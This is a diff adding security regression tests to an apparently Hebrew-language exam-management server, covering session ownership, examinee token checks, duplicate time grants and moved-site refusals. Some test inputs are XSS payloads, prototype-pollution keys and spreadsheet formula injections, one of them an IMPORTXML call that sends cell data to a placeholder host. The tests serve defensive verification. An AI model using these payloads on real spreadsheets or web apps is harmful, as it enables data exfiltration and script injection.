@@ -261,7 +261,7 @@ test('health&deep=1 times one cell of our own document and reports a failure ins
   const e = runtime();
   const ok = get(e, { action: 'health', deep: '1' });
   assert.equal(ok.status, 'ok');
-  assert.equal(ok.build, '2026-09-27-r34');
+  assert.equal(ok.build, '2026-09-27-r35');
   assert.equal(ok.deep, true);
   assert.equal(ok.indexIds, 1700);
   assert.ok(typeof ok.sheetMs === 'number' && ok.sheetMs >= 0);
@@ -279,7 +279,7 @@ test('health identifies build without Sheets, Drive or private parameters', () =
   e.ctx.getSheet = () => { throw new Error('health must not access Sheets'); };
   const result = get(e, { action: 'health', token: 'DO_NOT_LOG_ME' });
   assert.equal(result.status, 'ok');
-  assert.equal(result.build, '2026-09-27-r34');
+  assert.equal(result.build, '2026-09-27-r35');
   assert.equal(e.logs.length, 2);
   assert.ok(e.logs[0].includes('"phase":"start"'));
   assert.ok(e.logs[1].includes('"phase":"end"'));
@@ -1366,4 +1366,232 @@ test('exam hours: at the same moment a commander still lists the live sessions, 
     const row = e.rows('תוצאות').find(r => String(r[1]) === idOf(6));
     assert.deepEqual([row[5], row[7], row[20]], ['27/30', 'עבר', true], file);
   }
+});
+
+// ---- r35 (25/09/2026): the server security holes (KNOWN_ISSUES #43) ---------
+// Source: docs_private/research_2026-09-25/09_security_privacy_review.md §1-§3.2
+// and 01_server_inventory.md §8. Each block below is one hole, closed.
+const OTHER_EXAMINER = { examinerId: '222222222', token: 'tokB' };
+function r35Staff() {
+  const until = at(NOW + 86400000);
+  return staff().concat([
+    ['בוחן ב', '222222222', 'pw', 'כן', '8', 'בוחן', 'tokB', until, 0, '', ''],
+    ['בוחן מושבת', '333333333', 'pw', 'לא', '9', 'בוחן', 'tokD', until, 0, '', '']]);
+}
+const EXTENSIONS_HEADER = ['תאריך', 'קוד סשן', 'ת.ז.', 'שם', 'דקות', 'סיבה', 'בוחן'];
+// LIVE0001 belongs to 111111111 (PLAIN_EXAMINER): one examinee in the exam, one waiting.
+function r35Env(extraSheets, serverFile) {
+  return createEnv({ serverFile: serverFile || EXAM_BUILD, now: NOW, properties: Object.assign({}, GATEWAY_PROPS),
+    sources: ['deployment/answer_key.gs'],
+    sheets: Object.assign({ 'בוחנים': r35Staff(), 'סשנים': [SESSIONS_HEADER, openSession('LIVE0001')],
+      'ממתינים': [PENDING_HEADER, liveRow('LIVE0001', idOf(1), 'in_exam', NOW - 20 * MIN, NOW - 10 * MIN),
+        liveRow('LIVE0001', idOf(4), 'waiting', NOW - MIN)],
+      'תוצאות': [RESULTS_HEADER], 'מבחנים': [Array(6).fill('h')], 'הארכות זמן': [EXTENSIONS_HEADER] }, extraSheets || {}) });
+}
+const pendingStatusOf = (e, id) => e.rows('ממתינים').filter(r => String(r[1]) === id).map(r => r[5]).pop();
+
+test('r35 F-06: examinerDashboard — the session\'s own examiner and a מפקד read the board; any other examiner is refused', () => {
+  const e = r35Env();
+  const board = (who, code) => get(e, Object.assign({ action: 'examinerDashboard', origin: 'examiner-app',
+    sessionCode: code || 'LIVE0001' }, who));
+  const own = board(PLAIN_EXAMINER);
+  assert.equal(own.status, 'ok');
+  assert.deepEqual(own.active.map(a => String(a.idNumber)), [idOf(1)]);
+  assert.equal(e.cache.get('qv2_sview_111111111_LIVE0001'), '1', 'the owner\'s verdict is cached, so the board pays for סשנים once');
+  const commander = board(COMMANDER);
+  assert.equal(commander.status, 'ok', 'the commander\'s foreign-session view (listAllSessions → loadForeignSession) still works');
+  assert.deepEqual(commander.active.map(a => String(a.idNumber)), [idOf(1)]);
+
+  e.resetCounters();
+  const other = board(OTHER_EXAMINER);
+  assert.deepEqual(other, { status: 'error', code: 'not_session_owner', message: 'אין הרשאה — בוחן לא תואם לסשן' });
+  assert.equal(JSON.stringify(other).indexOf(idOf(1)), -1, 'not one ID number leaves');
+  const c = e.counters();
+  assert.equal(c.appends + c.setValues, 0, 'a refusal runs none of the board\'s reconciliation writes');
+  assert.equal(c.perSheet['ממתינים'].rangeReads + c.perSheet['ממתינים'].fullReads, 0, 'nor reads the session');
+  assert.equal(e.cache.get('qv2_sview_222222222_LIVE0001'), null, 'a refusal is never cached');
+
+  assert.equal(board(CENTER).code, 'not_session_owner', 'a center commander has no session boards (his screen is a report)');
+  assert.equal(board(PLAIN_EXAMINER, 'NOSUCH01').code, 'not_session_owner', 'a session that does not exist');
+  assert.equal(board({ examinerId: '111111111', token: 'stolen' }).tokenExpired, true, 'the token check still comes first');
+  assert.equal(e.ctx.apiRegistry().examinerDashboard.auth, 'examinerSession');
+});
+
+test('r35 D6: cancelDisqualify is gone — the examinee token no longer undoes a disqualification', () => {
+  const dqRow = resultRow('LIVE0001', idOf(1), NOW - MIN);
+  dqRow[5] = '0/30'; dqRow[7] = 'פסול'; dqRow[17] = true; dqRow[24] = 'e1';
+  const e = r35Env({ 'ממתינים': [PENDING_HEADER, liveRow('LIVE0001', idOf(1), 'disqualified', NOW - 20 * MIN, NOW - 10 * MIN)],
+    'תוצאות': [RESULTS_HEADER, dqRow] });
+  const body = { action: 'cancelDisqualify', sessionCode: 'LIVE0001', idNumber: idOf(1), examineeToken: 'token-' + idOf(1), dqEventId: 'e1' };
+  for (const reply of [get(e, body), postJson(e, body)]) {
+    assert.equal(reply.status, 'error');
+    assert.equal(reply.code, 'action_removed');
+  }
+  assert.equal(pendingStatusOf(e, idOf(1)), 'disqualified', 'the examiner still has the decision in front of him');
+  assert.equal(e.rows('תוצאות')[1][7], 'פסול');
+  assert.equal(typeof e.ctx.handleCancelDisqualify, 'undefined', 'the old handler is not in the file at all');
+});
+
+test('r35 D7: cancelRegistration needs the examinee token of the row it cancels', () => {
+  const e = r35Env();
+  const cancel = extra => get(e, Object.assign({ action: 'cancelRegistration', sessionCode: 'LIVE0001', idNumber: idOf(4) }, extra));
+  assert.equal(cancel({}).examineeTokenError, 'missing', 'the classroom-griefing call: code + ID, no token, no phone');
+  assert.equal(cancel({ phone: '' }).examineeTokenError, 'missing');
+  assert.equal(cancel({ examineeToken: 'token-' + idOf(1) }).examineeTokenError, 'mismatch', 'a classmate\'s own token');
+  assert.equal(pendingStatusOf(e, idOf(4)), 'waiting', 'nothing was cancelled');
+  assert.equal(cancel({ examineeToken: 'token-' + idOf(4) }).status, 'ok', 'the examinee\'s own page (its decorator attaches the token)');
+  assert.equal(pendingStatusOf(e, idOf(4)), 'cancelled');
+});
+
+test('r35 D8: markFinished needs the token when the row has one', () => {
+  const e = r35Env();
+  const mark = extra => postJson(e, Object.assign({ action: 'markFinished', sessionCode: 'LIVE0001', idNumber: idOf(1) }, extra));
+  const row = () => e.rows('ממתינים').find(r => String(r[1]) === idOf(1));
+  assert.equal(mark({}).examineeTokenError, 'missing');
+  assert.equal(mark({ examineeToken: 'token-' + idOf(4) }).examineeTokenError, 'mismatch');
+  assert.equal(row()[18] || '', '', '"סיים — מסנכרן" was not put on someone else\'s row');
+  assert.equal(mark({ examineeToken: 'token-' + idOf(1) }).status, 'ok');
+  assert.ok(row()[18], 'the examinee\'s own beacon still marks the row');
+});
+
+test('r35 D9: addExamTime — the same grant again within two minutes is the retry, not a second grant', () => {
+  const e = r35Env();
+  const add = extra => get(e, Object.assign({ action: 'addExamTime', origin: 'examiner-app', sessionCode: 'LIVE0001',
+    idNumber: idOf(1), minutes: '10', reason: 'פינוי למרחב מוגן' }, PLAIN_EXAMINER, extra || {}));
+  const first = add();
+  assert.equal(first.status, 'ok');
+  assert.equal(first.totalExtraMinutes, 10);
+  const retry = add();
+  assert.equal(retry.status, 'ok');
+  assert.equal(retry.duplicate, true);
+  assert.equal(retry.addedMinutes, 10);
+  assert.equal(retry.totalExtraMinutes, 10, 'the examinee got the ten minutes once');
+  assert.equal(e.rows('הארכות זמן').length, 2, 'one audit row');
+  // Another amount, another reason or another examinee is a new grant.
+  assert.equal(add({ minutes: '5' }).totalExtraMinutes, 15);
+  assert.equal(add({ reason: 'תקלה טכנית' }).totalExtraMinutes, 25);
+  // After the window the same grant is a real second grant again.
+  e.clock.t += 2 * MIN + 1000;
+  const later = add();
+  assert.equal(later.duplicate, undefined);
+  assert.equal(later.totalExtraMinutes, 35);
+  assert.equal(e.rows('הארכות זמן').length, 5);
+  // The ownership rule is unchanged: another examiner still gets nothing.
+  assert.equal(add(OTHER_EXAMINER).message, 'אין הרשאה — בוחן לא תואם לסשן');
+});
+
+test('r35 F-02c: startPractice mode=ids is refused for a national ID in a live exam; everyone else practises', () => {
+  const e = runtime({ sheets: { 'ממתינים': [PENDING_HEADER,
+    pendingRow(idOf(1), { 5: 'in_exam' }), pendingRow(idOf(2), { 5: 'approved' }), pendingRow(idOf(4), { 5: 'waiting' }),
+    pendingRow(idOf(5), { 5: 'in_exam', 4: at(NOW - 9 * HOUR) }), pendingRow(idOf(6), { 5: 'completed' })] } });
+  const ids = Object.keys(e.ctx.questionIndex()).slice(0, 5).join(',');
+  const byIds = extra => get(e, Object.assign({ action: 'startPractice', mode: 'ids', license: 'B', language: 'he', ids }, extra));
+  for (const who of [{ standaloneIdNumber: idOf(1) }, { idNumber: idOf(1) }, { studentId: idOf(1) }, { standaloneIdNumber: idOf(2) }]) {
+    const refused = byIds(who);
+    assert.deepEqual(refused, { status: 'error', code: 'practice_ids_refused', message: 'תרגול לפי רשימת שאלות אינו זמין כעת' },
+      JSON.stringify(who));
+  }
+  assert.equal(byIds({ standaloneIdNumber: idOf(4) }).status, 'ok', 'waiting is not an attempt yet');
+  assert.equal(byIds({ standaloneIdNumber: idOf(5) }).status, 'ok', 'a row older than the 8 h session lifetime');
+  assert.equal(byIds({ standaloneIdNumber: idOf(6) }).status, 'ok', 'a finished attempt');
+  e.resetCounters();
+  const student = byIds({ studentId: 'S-3f9a' });
+  assert.equal(student.status, 'ok', 'student.html names no national ID (its studentId is S + a hash)');
+  assert.equal(student.questions.length, 5);
+  const pend = e.counters().perSheet['ממתינים'];
+  assert.equal(pend.fullReads + pend.rangeReads, 0, 'and pays no read for the check');
+  assert.equal(get(e, { action: 'startPractice', mode: 'exam', license: 'B', standaloneIdNumber: idOf(1) }).status, 'ok',
+    'only mode=ids is refused');
+});
+
+test('r35 D23: a disabled examiner\'s token stops working — verifyToken checks "פעיל", like login does', () => {
+  const e = r35Env();
+  const list = who => get(e, Object.assign({ action: 'listSessions', origin: 'examiner-app' }, who));
+  assert.equal(list({ examinerId: '333333333', token: 'tokD' }).tokenExpired, true);
+  assert.equal(list(PLAIN_EXAMINER).status, 'ok');
+});
+
+test('r35 F-08: submitPracticeResult stores only the modes and licences student.html sends, and text as text', () => {
+  const e = runtime();
+  const send = extra => postJson(e, Object.assign({ action: 'submitPracticeResult', origin: 'student-app', studentId: 'S-1',
+    studentName: 'תלמיד', mode: 'exam', license: 'B', score: 10, total: 30, percent: 33, time: '10:00' }, extra || {}));
+  for (const bad of [{ mode: '<img src=x onerror=alert(1)>' }, { license: '<script>alert(1)</script>' }, { mode: 'review' },
+    { license: 'Z' }, { license: 'constructor' }, { license: '__proto__' }]) {
+    assert.deepEqual(send(bad), { status: 'error', code: 'invalid_practice_result', message: 'נתוני תרגול לא תקינים' }, JSON.stringify(bad));
+  }
+  const sheet = () => (e.sheets.get('תוצאות תרגול') ? e.rows('תוצאות תרגול') : [[]]);
+  assert.equal(sheet().length, 1, 'no refused row was written');
+  assert.equal(send().status, 'ok');
+  assert.equal(send({ mode: 'category', license: 'C1' }).status, 'ok');
+  assert.equal(send({ studentName: '=IMPORTXML("https://x.invalid/?"&A1,"//a")', phone: '+972500000000' }).status, 'ok');
+  const row = sheet().at(-1);
+  assert.equal(row[2], '\'=IMPORTXML("https://x.invalid/?"&A1,"//a")', 'stored as text, never as a formula');
+  assert.equal(row[15], '\'+972500000000');
+  assert.equal(sheet().length, 4);
+});
+
+test('r35 F-15: a registration stores what the examinee typed as text, never as a formula', () => {
+  const e = runtime({ sheets: { 'ממתינים': [PENDING_HEADER] } });
+  const reply = get(e, { action: 'registerExaminee', sessionCode: SESSION, idNumber: '900000077',
+    fullName: '=HYPERLINK("https://x.invalid","x")', phone: '+972501112233', population: '@pop', site: '-site',
+    language: 'he', license: 'B' });
+  assert.equal(reply.status, 'ok');
+  const row = e.rows('ממתינים').at(-1);
+  assert.deepEqual([row[1], row[2], row[3], row[6], row[7], row[8], row[17]],
+    ['900000077', '\'=HYPERLINK("https://x.invalid","x")', '\'+972501112233', 'he', '\'@pop', 'B', '\'-site']);
+});
+
+test('r35: cellSafe prefixes exactly the formula starters and leaves everything else alone', () => {
+  const e = runtime();
+  for (const s of ['=1+1', '+1', '-1', '@a', '\t=1', '\r=1']) assert.equal(e.ctx.cellSafe(s), '\'' + s, JSON.stringify(s));
+  for (const v of ['', 'דני', '0501234567', ' =1', 'a=b', 12, true, null, undefined]) assert.equal(e.ctx.cellSafe(v), v, JSON.stringify(v));
+});
+
+// r35 (KNOWN_ISSUES #44): a site that moved to the new system can no longer open
+// a session on the old one. Script Property MOVED_SITES (JSON array of site
+// names); MOVED_SITES_URL is quoted in the refusal. Open sessions run on.
+test('r35 MOVED_SITES: a moved site opens no new session, its open session runs on, and unset changes nothing', () => {
+  const create = (e, extra) => get(e, Object.assign({ action: 'createSession', origin: 'examiner-app', site: 'בסיס 6',
+    classroom: '1', license: 'B', language: 'he', audioMode: 'off',
+    quotas: JSON.stringify([{ license: 'B', requested: 10, approved: 10 }]) }, PLAIN_EXAMINER, extra || {}));
+  const health = e => get(e, { action: 'health' });
+
+  const unset = r35Env();
+  assert.equal(create(unset).status, 'ok', 'no property: behaviour unchanged');
+  assert.equal(health(unset).movedSites, 0);
+  for (const empty of ['', '[]', '  ']) {
+    unset.properties.set('MOVED_SITES', empty);
+    assert.equal(create(unset).status, 'ok', 'empty value ' + JSON.stringify(empty));
+  }
+
+  const e = r35Env();
+  e.properties.set('MOVED_SITES', JSON.stringify(['בסיס 6', ' בסיס  9 ']));
+  const sessionsBefore = e.rows('סשנים').length;
+  assert.deepEqual(create(e), { status: 'error', code: 'site_moved', site: 'בסיס 6',
+    message: 'האתר "בסיס 6" עבר למערכת החדשה — יש להשתמש בקישור החדש' });
+  assert.equal(e.rows('סשנים').length, sessionsBefore, 'a refusal writes no session row');
+  const guest = create(e, { site: 'בסיס 7', quotas: JSON.stringify([{ license: 'B', requested: 5, approved: 5 },
+    { site: 'בסיס 9', license: 'B', requested: 3, approved: 3 }]) });
+  assert.equal(guest.code, 'site_moved', 'a moved GUEST site is refused too (names compared trimmed, spaces collapsed)');
+  assert.equal(guest.site, 'בסיס 9');
+  e.properties.set('MOVED_SITES_URL', 'https://new.example.invalid/examiner');
+  const withUrl = create(e);
+  assert.equal(withUrl.url, 'https://new.example.invalid/examiner');
+  assert.equal(withUrl.message, 'האתר "בסיס 6" עבר למערכת החדשה — יש להשתמש בקישור החדש: https://new.example.invalid/examiner');
+  assert.equal(create(e, { site: 'בסיס 7' }).status, 'ok', 'every other site opens as before');
+  assert.equal(health(e).movedSites, 2, 'health reports the count, never the names');
+
+  // LIVE0001 is a session of 'בסיס 6' that was open before the move: it finishes normally.
+  assert.equal(get(e, { action: 'getSessionInfo', sessionCode: 'LIVE0001' }).status, 'ok');
+  assert.equal(get(e, { action: 'registerExaminee', sessionCode: 'LIVE0001', idNumber: idOf(9), fullName: 'נבחן', phone: '0500000009',
+    license: 'B', language: 'he' }).status, 'ok');
+  assert.equal(get(e, Object.assign({ action: 'examinerDashboard', origin: 'examiner-app', sessionCode: 'LIVE0001' }, PLAIN_EXAMINER)).status, 'ok');
+
+  // A value that is not a JSON array of strings is refused loudly, never read as "nothing moved".
+  for (const typo of ['בסיס 6, בסיס 9', '{"site":"בסיס 6"}', '[6]', '"בסיס 6"']) {
+    e.properties.set('MOVED_SITES', typo);
+    assert.equal(create(e, { site: 'בסיס 7' }).code, 'moved_sites_invalid', typo);
+    assert.equal(health(e).movedSites, 'invalid', typo);
+  }
+  assert.equal(e.rows('סשנים').filter(r => r[3] === 'בסיס 6' && r[0] !== 'LIVE0001').length, 0, 'no new session of the moved site at any point');
 });
